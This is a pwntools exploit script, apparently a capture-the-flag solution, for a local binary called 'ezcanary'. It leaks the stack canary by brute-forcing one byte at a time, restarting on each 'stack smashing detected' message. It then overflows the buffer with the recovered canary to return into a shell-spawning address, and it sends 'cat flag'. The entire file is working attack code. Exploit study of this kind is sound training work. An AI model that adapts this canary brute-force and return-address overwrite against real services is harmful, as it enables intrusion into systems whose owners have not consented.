from pwn import *
#context(arch = 'amd64', os = 'linux', log_level = 'debug')
context(arch = 'amd64', os = 'linux')
p = process('./ezcanary')
#p = remote("ip",port)
#elf = ELF('./ezcanary')
#libc = ELF('./libc.so.6')

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

def aaa() :
  global can
  for i in range(256):
    payload1 = (0x60-8) * b'a' + can + p8(i)
    p.sendafter('你觉得呢？\n',payload1)
    info = p.recvuntil('\n')
    if b"*** stack smashing detected ***" in info :
        p.send('n\n')
        continue
    else :
        can += p8(i)
        break
 
def bbb():
  global can
  can = b'\x00'
  for i in range(7):
    aaa()
    if i != 6 :
      p.send('a\n')
    else :
      p.sendline('cat flag')
 
 
bbb()
canary = u64(can)
lg('canary')
getshell = 0x401251
payload2 = b"a" * (0x60-8) + p64(canary) + p64(0) + p64(getshell)
p.sendafter("bruteforce\n", payload2)

p.interactive()
